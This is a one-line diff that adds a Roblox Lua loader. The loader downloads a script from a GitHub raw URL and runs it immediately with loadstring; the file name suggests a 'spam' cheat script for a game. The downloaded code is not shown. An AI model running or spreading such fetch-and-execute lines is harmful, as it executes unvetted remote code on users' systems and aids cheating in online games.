@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/rivals-spam0-5i0jvsx0n0tn8f.lua"))()
